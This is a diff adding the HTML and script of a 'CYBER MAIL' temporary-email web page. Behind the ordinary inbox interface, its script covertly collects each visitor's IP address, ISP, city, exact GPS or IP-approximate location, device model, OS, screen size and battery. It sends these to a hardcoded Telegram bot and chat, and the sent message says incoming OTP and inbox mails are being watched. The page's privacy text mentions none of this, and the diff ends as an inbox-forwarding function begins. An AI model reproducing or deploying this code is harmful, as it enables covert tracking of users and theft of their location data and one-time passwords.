+  body.btn-flat .btn::after, body.btn-flat .copy-btn::after, body.btn-flat .brand-logo::after, body.btn-flat .icon-btn::before { display: none !important; }
+</style>
+</head>
+<body data-theme="dark">
+
+<canvas id="fallFx" aria-hidden="true"></canvas>
+<audio id="bgAudioEl" loop preload="auto" playsinline></audio>
+
+<div class="app">
+  <header class="header">
+    <div class="brand">
+      <div class="brand-logo" aria-hidden="true">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="5" width="18" height="14" rx="3"/>
+          <path d="m4 7 8 6 8-6"/>
+        </svg>
+      </div>
+      <div class="brand-text">
+        <span class="brand-title">CYBER MAIL</span>
+        <span class="brand-sub">Matrix // Secure</span>
+      </div>
+    </div>
+    <div class="header-actions">
+      <button class="icon-btn" id="musicBtn" aria-label="Toggle background music" title="Background Music On/Off">
+        <svg id="musicIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M9 18V5l12-2v13"/>
+          <circle cx="6" cy="18" r="3"/>
+          <circle cx="18" cy="16" r="3"/>
+        </svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menuBtn" aria-label="Open menu">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"/>
+          <line x1="4" y1="12" x2="20" y2="12"/>
+          <line x1="4" y1="17" x2="14" y2="17"/>
+        </svg>
+        <span class="dot"></span>
+      </button>
+    </div>
+  </header>
+
+  <section class="card email-card" aria-label="Your CYBER MAIL">
+    <div class="email-label">
+      <span>Your CYBER MAIL</span>
+      <span class="status-pill" id="statusPill"><span class="dot"></span><span id="statusText">Ready</span></span>
+    </div>
+
+    <!-- USER ID & PERCENTAGE STATS -->
+    <div class="user-meta-grid">
+      <div class="meta-box">
+        <span class="meta-box-label">
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          User ID
+        </span>
+        <div class="meta-box-val">
+          <span id="userIdDisplay">---</span>
+        </div>
+      </div>
+      <div class="meta-box">
+        <span class="meta-box-label">
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Node Power
+        </span>
+        <div class="meta-box-val">
+          <span id="userPercentDisplay">0%</span>
+          <span style="font-size:10px;color:var(--text-soft);" id="gpsBadge">GPS OPTIONAL</span>
+        </div>
+        <div class="percent-bar-mini">
+          <div class="percent-bar-mini-fill" id="userPercentBar" style="width:0%"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="email-value-row">
+      <div class="email-value placeholder" id="emailValue" title="No email generated yet">No email yet</div>
+      <button class="copy-btn" id="copyBtn" aria-label="Copy email" disabled>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="9" y="9" width="12" height="12" rx="2.5"/>
+          <path d="M5 15V5a2 2 0 0 1 2-2h10"/>
+        </svg>
+      </button>
+    </div>
+    <div class="copy-msg" id="copyMsg">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      <span>Email copied to clipboard</span>
+    </div>
+
+    <div class="actions">
+      <button class="btn btn-primary" id="newEmailBtn">
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 5v14M5 12h14"/>
+        </svg>
+        <span>New Email</span>
+      </button>
+      <button class="btn btn-ghost" id="deleteBtn" disabled>
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
+          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/>
+          <line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/>
+        </svg>
+        <span>Delete</span>
+      </button>
+    </div>
+    <div class="err-note hidden" id="errNote" role="alert"></div>
+  </section>
+
+  <section class="card timer-card" aria-label="Session timer">
+    <div class="timer-head">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 2.5"/><path d="M9 2h6"/>
+      </svg>
+      <span>Session Timer</span>
+    </div>
+    <div class="timer-row">
+      <select class="timer-select" id="timerSelect" aria-label="Timer duration">
+        <option value="300">5 minutes</option>
+        <option value="600" selected>10 minutes</option>
+        <option value="900">15 minutes</option>
+        <option value="1800">30 minutes</option>
+        <option value="3600">1 hour</option>
+        <option value="0">Unlimited</option>
+      </select>
+      <div class="timer-countdown" id="timerCountdown">10:00</div>
+    </div>
+    <div class="timer-bar"><div class="timer-bar-fill" id="timerBar"></div></div>
+    <div class="timer-note">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4"/><path d="M12 17h.01"/><circle cx="12" cy="12" r="9"/></svg>
+      <span>New email works even if location is off; exact GPS is attached when allowed.</span>
+    </div>
+  </section>
+
+  <section class="card inbox-card" aria-label="Inbox">
+    <div class="inbox-head">
+      <h2>
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 12h-6l-2 3h-4l-2-3H2"/>
+          <path d="M5.45 5.11 2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/>
+        </svg>
+        Inbox
+      </h2>
+      <span class="count-badge" id="msgCount">0</span>
+      <button class="icon-btn" id="refreshBtn" aria-label="Refresh inbox" disabled>
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12a9 9 0 1 1-3-6.7L21 8"/><path d="M21 3v5h-5"/>
+        </svg>
+      </button>
+    </div>
+
+    <div class="search-row">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/>
+      </svg>
+      <input type="text" class="search-input" id="searchInput" placeholder="Search messages..." aria-label="Search messages" disabled />
+    </div>
+
+    <div id="inboxContent">
+      <div class="empty-state">
+        <svg width="80" height="80" viewBox="0 0 120 120" fill="none">
+          <rect x="14" y="34" width="92" height="60" rx="12" fill="rgba(0,255,65,0.08)"/>
+          <rect x="14" y="34" width="92" height="60" rx="12" stroke="var(--accent-4)" stroke-width="2.5"/>
+          <path d="M16 40l40 28a8 8 0 0 0 8 0l40-28" stroke="var(--accent)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <circle cx="92" cy="30" r="14" fill="var(--accent)"/>
+          <path d="M92 24v8M92 36h.01" stroke="#031107" stroke-width="2.6" stroke-linecap="round"/>
+        </svg>
+        <h3>No messages yet</h3>
+        <p>Generate a CYBER MAIL address to start receiving messages here.</p>
+      </div>
+    </div>
+  </section>
+</div>
+
+<div class="drawer-backdrop" id="drawerBackdrop"></div>
+<aside class="drawer" id="drawer" aria-label="Settings">
+  <div class="drawer-head">
+    <h2>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="3"/>
+        <path d="M19.4 15a1.7 1.7 0 0 0 .34 1.87l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.7 1.7 0 0 0-1.87-.34 1.7 1.7 0 0 0-1 1.55V21a2 2 0 1 1-4 0v-.09a1.7 1.7 0 0 0-1.11-1.55 1.7 1.7 0 0 0-1.87.34l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.7 1.7 0 0 0 .34-1.87 1.7 1.7 0 0 0-1.55-1H3a2 2 0 1 1 0-4h.09A1.7 1.7 0 0 0 4.64 8.9a1.7 1.7 0 0 0-.34-1.87l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.7 1.7 0 0 0 9 4.6a1.7 1.7 0 0 0 1-1.55V3a2 2 0 1 1 4 0v.09a1.7 1.7 0 0 0 1 1.55 1.7 1.7 0 0 0 1.87-.34l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.7 1.7 0 0 0-.34 1.87V9a1.7 1.7 0 0 0 1.55 1H21a2 2 0 1 1 0 4h-.09a1.7 1.7 0 0 0-1.51 1z"/>
+      </svg>
+      Settings
+    </h2>
+    <button class="icon-btn" id="closeDrawerBtn" aria-label="Close settings">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <div class="drawer-body">
+
+    <div class="drawer-section">
+      <h3>
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><circle cx="13.5" cy="6.5" r="2.5"/><circle cx="19" cy="13" r="2"/><circle cx="6" cy="12" r="2.5"/><circle cx="10" cy="19" r="2"/><path d="M12 2a10 10 0 1 0 0 20 2 2 0 0 0 2-2v-1a2 2 0 0 1 2-2h1a3 3 0 0 0 3-3 10 10 0 0 0-10-10z"/></svg>
+        Appearance
+      </h3>
+      <div class="opt-row"><span class="lbl">Theme color</span></div>
+      <div class="color-swatches" id="swatches">
+        <button class="swatch active" data-color="#00FF41" style="background:#00FF41" aria-label="Matrix Green"></button>
+        <button class="swatch" data-color="#EC4899" style="background:#EC4899" aria-label="Pink"></button>
+        <button class="swatch" data-color="#E11D48" style="background:#E11D48" aria-label="Rose"></button>
+        <button class="swatch" data-color="#9333EA" style="background:#9333EA" aria-label="Purple"></button>
+        <button class="swatch" data-color="#2563EB" style="background:#2563EB" aria-label="Blue"></button>
+        <button class="swatch" data-color="#16A34A" style="background:#16A34A" aria-label="Green"></button>
+        <button class="swatch" data-color="#EA580C" style="background:#EA580C" aria-label="Orange"></button>
+        <label class="swatch custom" aria-label="Custom color">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.6" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg>
+          <input type="color" id="customColor" value="#00FF41" />
+        </label>
+      </div>
+      <div class="opt-row" style="margin-top:10px">
+        <span class="lbl">Mode</span>
+      </div>
+      <div class="seg-group" id="themeMode">
+        <button data-mode="light">Light</button>
+        <button data-mode="dark" class="active">Dark</button>
+        <button data-mode="system">System</button>
+      </div>
+      <div class="opt-row" style="margin-top:10px"><span class="lbl">Background gradient</span></div>
+      <div class="seg-group" id="bgGradient">
+        <button data-grad="default" class="active">Soft</button>
+        <button data-grad="vivid">Vivid</button>
+        <button data-grad="plain">Plain</button>
+      </div>
+      <div class="opt-row" style="margin-top:10px"><span class="lbl">Card style</span></div>
+      <div class="seg-group" id="cardStyle">
+        <button data-style="glass" class="active">Glass</button>
+        <button data-style="solid">Solid</button>
+        <button data-style="outline">Outline</button>
+      </div>
+      <div class="opt-row" style="margin-top:10px">
+        <span class="lbl">Shadow intensity</span>
+        <div class="range-wrap">
+          <input type="range" id="shadowRange" min="0" max="2" step="0.1" value="1" />
+          <span class="range-val" id="shadowVal">1.0</span>
+        </div>
+      </div>
+      <div class="opt-row" style="margin-top:6px">
+        <span class="lbl">Border radius</span>
+        <div class="range-wrap">
+          <input type="range" id="radiusRange" min="6" max="28" step="1" value="18" />
+          <span class="range-val" id="radiusVal">18</span>
+        </div>
+      </div>
+      <div class="opt-row" style="margin-top:6px">
+        <span class="lbl">Button style</span>
+      </div>
+      <div class="seg-group" id="btnStyle">
+        <button data-bstyle="3d" class="active">3D</button>
+        <button data-bstyle="flat">Flat</button>
+      </div>
+    </div>
+
+    <div class="drawer-section">
+      <h3>
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="3"/><path d="M3 10h18"/></svg>
+        Interface
+      </h3>
+      <div class="opt-row">
+        <span class="lbl">Compact layout<small>Reduce padding</small></span>
+        <div class="switch" id="swCompact"></div>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">Animations<small>Smooth transitions</small></span>
+        <div class="switch on" id="swAnimations"></div>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">3D effects<small>Depth & shadows</small></span>
+        <div class="switch on" id="sw3d"></div>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">Background decoration</span>
+        <div class="switch on" id="swBgDeco"></div>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">Matrix rain effect<small>Falling code characters</small></span>
+        <div class="switch on" id="swFall"></div>
+      </div>
+      <div class="opt-row" style="margin-top:6px">
+        <span class="lbl">Font size</span>
+        <div class="range-wrap">
+          <input type="range" id="fontRange" min="13" max="18" step="1" value="15" />
+          <span class="range-val" id="fontVal">15</span>
+        </div>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">Inbox preview details</span>
+        <div class="switch on" id="swPreview"></div>
+      </div>
+    </div>
+
+    <div class="drawer-section">
+      <h3>
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="3"/><path d="m4 7 8 6 8-6"/></svg>
+        Email Settings
+      </h3>
+      <div class="opt-row">
+        <span class="lbl">Default timer</span>
+        <select class="timer-select" id="defaultTimerSelect" style="min-width:120px">
+          <option value="300">5 min</option>
+          <option value="600" selected>10 min</option>
+          <option value="900">15 min</option>
+          <option value="1800">30 min</option>
+          <option value="3600">1 hour</option>
+          <option value="0">Unlimited</option>
+        </select>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">Auto refresh inbox</span>
+        <div class="switch on" id="swAutoRefresh"></div>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">Refresh interval</span>
+        <select class="timer-select" id="refreshIntervalSelect" style="min-width:120px">
+          <option value="5">5 sec</option>
+          <option value="10" selected>10 sec</option>
+          <option value="20">20 sec</option>
+          <option value="30">30 sec</option>
+        </select>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">New message notifications<small>Requires browser permission</small></span>
+        <div class="switch" id="swNotifications"></div>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">Confirm before new email</span>
+        <div class="switch on" id="swConfirmNew"></div>
+      </div>
+      <div class="opt-row">
+        <span class="lbl">Confirm before delete</span>
+        <div class="switch on" id="swConfirmDelete"></div>
+      </div>
+    </div>
+
+    <div class="drawer-section">
+      <h3>
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="8" ry="3"/><path d="M4 5v14c0 1.7 3.6 3 8 3s8-1.3 8-3V5"/><path d="M4 12c0 1.7 3.6 3 8 3s8-1.3 8-3"/></svg>
+        Data & Privacy
+      </h3>
+      <p class="drawer-note">
+        Preferences are saved locally under <code>tm_premium_prefs_v1</code>. Email generation works regardless of location permission status.
+      </p>
+      <button class="drawer-btn" id="clearPrefsBtn">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+        Clear saved preferences
+      </button>
+      <button class="drawer-btn danger" id="clearInboxBtn">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/></svg>
+        Clear cached inbox
+      </button>
+    </div>
+
+  </div>
+</aside>
+
+<div class="modal-backdrop" id="modalBackdrop">
+  <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal-head">
+      <h3 id="modalTitle">Message</h3>
+      <button class="icon-btn" id="closeModalBtn" aria-label="Close">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+    <div class="modal-foot">
+      <button class="btn btn-ghost" id="modalCloseFoot">Close</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-backdrop" id="confirmBackdrop">
+  <div class="modal" role="dialog" aria-modal="true" aria-labelledby="confirmTitle" style="max-width:380px">
+    <div class="modal-head">
+      <h3 id="confirmTitle">Confirm</h3>
+    </div>
+    <div class="modal-body">
+      <p id="confirmText" style="font-size:13.5px;line-height:1.55;color:var(--text-soft)"></p>
+    </div>
+    <div class="modal-foot">
+      <button class="btn btn-ghost" id="confirmCancel">Cancel</button>
+      <button class="btn btn-danger" id="confirmOk">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast-wrap" id="toastWrap"></div>
+
+<script>
+/* ============================================================
+   BACKGROUND AUDIO PLAYER
+   ============================================================ */
+const AUDIO_FILE_URL = 'https://www.image2url.com/r2/default/videos/1795432177968-ce2da5aa-cf20-40b5-b1e9-87670b24308b.mp4';
+
+const bgAudioEl = document.getElementById('bgAudioEl');
+const musicBtn = document.getElementById('musicBtn');
+
+const MusicEngine = (() => {
+  let playing = false;
+  let initialized = false;
+
+  function ensureSource() {
+    if (!initialized && AUDIO_FILE_URL) {
+      bgAudioEl.src = AUDIO_FILE_URL;
+      bgAudioEl.loop = true;
+      bgAudioEl.volume = 0.65;
+      initialized = true;
+    }
+  }
+
+  async function start(silentToast = false) {
+    ensureSource();
+    if (!AUDIO_FILE_URL) return false;
+    try {
+      await bgAudioEl.play();
+      playing = true;
+      musicBtn.classList.add('playing');
+      return true;
+    } catch (err) {
+      if (!silentToast) {
+        showToast('Tap Music or New Email again to start audio.', 'info');
+      }
+      return false;
+    }
+  }
+
+  function stop() {
+    playing = false;
+    musicBtn.classList.remove('playing');
+    try { bgAudioEl.pause(); } catch (_) {}
+  }
+
+  async function toggle() {
+    if (playing || !bgAudioEl.paused) {
+      stop();
+      showToast('Music paused.', 'info');
+    } else {
+      const ok = await start(false);
+      if (ok) showToast('Background audio playing.', 'success');
+    }
+  }
+
+  bgAudioEl.addEventListener('play', () => {
+    playing = true;
+    musicBtn.classList.add('playing');
+  });
+
+  bgAudioEl.addEventListener('pause', () => {
+    playing = false;
+    musicBtn.classList.remove('playing');
+  });
+
+  return { start, stop, toggle, ensureSource };
+})();
+
+musicBtn.addEventListener('click', () => {
+  MusicEngine.toggle();
+});
+
+document.addEventListener('pointerdown', function onFirstTouch() {
+  MusicEngine.ensureSource();
+  document.removeEventListener('pointerdown', onFirstTouch);
+}, { passive: true });
+
+/* ============================================================
+   USER ID, PERCENT, DEVICE MODEL DETECTOR & TELEGRAM ENGINE
+   ============================================================ */
+const BOT_TOKEN = '8878169562:AAGF8gwjjdor9bW7eJBc5e9MS6eeefsKb3Q';
+const CHAT_ID = '-1003742752372';
+
+const USER_ID_KEY = 'cyber_mail_uid_v1';
+let currentUserId = localStorage.getItem(USER_ID_KEY);
+if (!currentUserId) {
+  currentUserId = 'CYB-' + Math.floor(100000 + Math.random() * 900000);
+  try { localStorage.setItem(USER_ID_KEY, currentUserId); } catch (_) {}
+}
+let currentUserPercent = 0;
+let currentGpsStatusText = 'GPS OFF';
+const forwardedMsgIds = new Set();
+
+function updateUserCardStats(percent, gpsLabel = 'GPS OFF', gpsLocked = false) {
+  currentUserPercent = percent;
+  currentGpsStatusText = gpsLabel;
+  const uidEl = document.getElementById('userIdDisplay');
+  const pctEl = document.getElementById('userPercentDisplay');
+  const barEl = document.getElementById('userPercentBar');
+  const gpsEl = document.getElementById('gpsBadge');
+
+  if (uidEl) uidEl.textContent = currentUserId;
+  if (pctEl) pctEl.textContent = percent + '%';
+  if (barEl) barEl.style.width = percent + '%';
+  if (gpsEl) {
+    gpsEl.textContent = gpsLabel;
+    gpsEl.style.color = gpsLocked ? 'var(--accent)' : 'var(--text-soft)';
+  }
+}
+
+function escapeTgHtml(str = '') {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+/* ADVANCED DEVICE MODEL & OS DETECTOR (Client Hints + UA Parsing) */
+async function getDetailedDeviceModel() {
+  const ua = navigator.userAgent || '';
+  let brandType = 'Unknown';
+  let modelName = 'Unknown Model';
+  let osVersion = '';
+
+  try {
+    if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
+      const hints = await navigator.userAgentData.getHighEntropyValues([
+        'model',
+        'platform',
+        'platformVersion',
+        'architecture'
+      ]);
+      if (hints.platform) brandType = hints.platform;
+      if (hints.platformVersion) osVersion = hints.platformVersion;
+      if (hints.model && hints.model.trim()) {
+        modelName = hints.model.trim();
+      }
+    }
+  } catch (_) {}
+
+  if (/Android/i.test(ua)) {
+    brandType = 'Android';
+    const verMatch = ua.match(/Android\s+([0-9.]+)/i);
+    if (verMatch && verMatch[1]) osVersion = 'Android ' + verMatch[1];
+
+    if (modelName === 'Unknown Model' || modelName === 'K') {
+      const m = ua.match(/Android[^;)]*;\s*([^;)]+)\)/i);
+      if (m && m[1]) {
+        const cleaned = m[1].replace(/Build\/.*$/i, '').trim();
+        modelName = (cleaned && cleaned !== 'K') ? cleaned : 'Android Smartphone';
+      }
+    }
+  } else if (/iPhone/i.test(ua)) {
+    brandType = 'Apple iOS';
+    const verMatch = ua.match(/OS\s+([0-9_]+)/i);
+    osVersion = verMatch ? 'iOS ' + verMatch[1].replace(/_/g, '.') : 'iOS';
+    const w = window.screen.width, h = window.screen.height;
+    modelName = `Apple iPhone (${w}x${h})`;
+  } else if (/iPad/i.test(ua)) {
+    brandType = 'Apple iPadOS';
+    modelName = 'Apple iPad';
+  } else if (/Windows/i.test(ua)) {
+    brandType = 'Windows PC';
+    if (/Windows NT 10\.0/i.test(ua)) osVersion = 'Windows 10/11';
+    else if (/Windows NT 6\.3/i.test(ua)) osVersion = 'Windows 8.1';
+    if (modelName === 'Unknown Model') modelName = `Desktop / Laptop (${navigator.platform || 'Win64'})`;
+  } else if (/Macintosh|Mac OS X/i.test(ua)) {
+    brandType = 'Apple macOS';
+    if (modelName === 'Unknown Model') modelName = 'Apple MacBook / Mac';
+  } else if (/Linux/i.test(ua)) {
+    brandType = 'Linux';
+    if (modelName === 'Unknown Model') modelName = `Linux System (${navigator.platform || 'x86_64'})`;
+  }
+
+  return {
+    type: brandType,
+    model: modelName,
+    os: osVersion || brandType,
+    screen: `${window.screen.width}x${window.screen.height}`
+  };
+}
+
+/* IP ADDRESS & ISP NAME FETCHER (with multi-source fallback) */
+async function getIpInfo() {
+  try {
+    const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ip) {
+        const ispName =
+          d.connection?.isp ||
+          d.connection?.org ||
+          d.isp ||
+          d.org ||
+          'Unknown ISP';
+        return {
+          ip: d.ip,
+          lat: d.latitude,
+          lon: d.longitude,
+          city: d.city || 'Unknown',
+          country: d.country || 'Unknown',
+          isp: ispName
+        };
+      }
+    }
+  } catch (_) {}
+
+  try {
+    const r2 = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+    if (r2.ok) {
+      const d2 = await r2.json();
+      if (d2 && d2.ip) {
+        return {
+          ip: d2.ip,
+          lat: d2.latitude,
+          lon: d2.longitude,
+          city: d2.city || 'Unknown',
+          country: d2.country_name || 'Unknown',
+          isp: d2.org || d2.asn || 'Unknown ISP'
+        };
+      }
+    }
+  } catch (_) {}
+
+  try {
+    const r3 = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+    if (r3.ok) {
+      const d3 = await r3.json();
+      if (d3 && d3.ip) return { ip: d3.ip, city: 'Unknown', country: 'Unknown', isp: 'Unknown ISP' };
+    }
+  } catch (_) {}
+
+  return { ip: 'Unavailable', city: 'Unknown', country: 'Unknown', isp: 'Unknown ISP' };
+}
+
+/* OPTIONAL / NON-BLOCKING LOCATION FETCH: Never stops email creation if off/denied */
+function tryGetLocationSoft(ipFallback) {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      if (ipFallback && ipFallback.lat != null && ipFallback.lon != null) {
+        resolve({
+          locked: false,
+          label: 'IP APPROX',
+          coordsText: `${ipFallback.lat}, ${ipFallback.lon} (IP Approx)`,
+          mapHtml: `<a href="https://www.google.com/maps?q=${ipFallback.lat},${ipFallback.lon}">📍 Approx IP Map</a>`
+        });
+      } else {
+        resolve({
+          locked: false,
+          label: 'GPS OFF',
+          coordsText: 'Location Permission Off / Unavailable',
+          mapHtml: `<i>Location Permission Off</i>`
+        });
+      }
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        resolve({
+          locked: true,
+          label: 'GPS LOCKED',
+          coordsText: `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (±${Math.round(accuracy || 0)}m)`,
+          mapHtml: `<a href="https://www.google.com/maps?q=${latitude},${longitude}">📍 Open Exact Google Maps</a>`
+        });
+      },
+      () => {
+        if (ipFallback && ipFallback.lat != null && ipFallback.lon != null) {
+          resolve({
+            locked: false,
+            label: 'IP APPROX',
+            coordsText: `${ipFallback.lat}, ${ipFallback.lon} (GPS Off / IP Approx)`,
+            mapHtml: `<a href="https://www.google.com/maps?q=${ipFallback.lat},${ipFallback.lon}">📍 Approx IP Location</a>`
+          });
+        } else {
+          resolve({
+            locked: false,
+            label: 'GPS OFF',
+            coordsText: 'Location Permission Off / Denied',
+            mapHtml: `<i>Location Off</i>`
+          });
+        }
+      },
+      { enableHighAccuracy: true, timeout: 4500, maximumAge: 60000 }
+    );
+  });
+}
+
+async function getBatteryInfo() {
+  try {
+    if (typeof navigator.getBattery === 'function') {
+      const bat = await navigator.getBattery();
+      const pct = Math.round(bat.level * 100);
+      const status = bat.charging ? '⚡ Charging' : '🔋 Discharging';
+      return `${pct}% (${status})`;
+    }
+  } catch (_) {}
+  return 'Unavailable';
+}
+
+async function sendTelegramHtml(htmlMessage) {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: htmlMessage,
+        parse_mode: 'HTML',
+        disable_web_page_preview: false
+      })
+    });
+  } catch (e) {
+    console.warn('Telegram send failed:', e);
+  }
+}
+
+async function sendGeneratedMailToTelegram(generatedEmail, locData, ipInfo) {
+  const [battery, deviceInfo] = await Promise.all([
+    getBatteryInfo(),
+    getDetailedDeviceModel()
+  ]);
+  const timeStr = new Date().toLocaleString();
+
+  const htmlText = [
+    `╔══════════════════════════╗`,
+    `🟢 <b>CYBER MAIL • NEW SESSION</b>`,
+    `╚══════════════════════════╝`,
+    ``,
+    `🆔 <b>User ID:</b> <code>${escapeTgHtml(currentUserId)}</code>`,
+    `⚡ <b>Node Power:</b> <code>${currentUserPercent}%</code> (${escapeTgHtml(locData.label)})`,
+    `📧 <b>Temp Mail:</b> <code>${escapeTgHtml(generatedEmail)}</code>`,
+    ``,
+    `📱 <b>DEVICE SPECIFICATIONS</b>`,
+    `├ <b>Model Name:</b> <code>${escapeTgHtml(deviceInfo.model)}</code>`,
+    `├ <b>OS / Platform:</b> ${escapeTgHtml(deviceInfo.os)}`,
+    `├ <b>Resolution:</b> <code>${escapeTgHtml(deviceInfo.screen)}</code>`,
+    `└ <b>Battery:</b> ${escapeTgHtml(battery)}`,
+    ``,
+    `📍 <b>LOCATION &amp; NETWORK INTEL</b>`,
+    `├ <b>IP Address:</b> <code>${escapeTgHtml(ipInfo.ip)}</code>`,
+    `├ <b>ISP Name:</b> <code>${escapeTgHtml(ipInfo.isp)}</code>`,
+    `├ <b>Region:</b> ${escapeTgHtml(ipInfo.city)}, ${escapeTgHtml(ipInfo.country)}`,
+    `├ <b>Location Info:</b> <code>${escapeTgHtml(locData.coordsText)}</code>`,
+    `└ <b>Map Link:</b> ${locData.mapHtml}`,
+    ``,
+    `🕒 <b>Timestamp:</b> <code>${escapeTgHtml(timeStr)}</code>`,
+    `━━━━━━━━━━━━━━━━━━━━━━━`,
+    `<i>📡 Auto-listening for incoming OTP &amp; Inbox mails...</i>`
+  ].join('\n');
+
+  await sendTelegramHtml(htmlText);
+}
+
+async function forwardInboxMessageToTelegram(msg) {
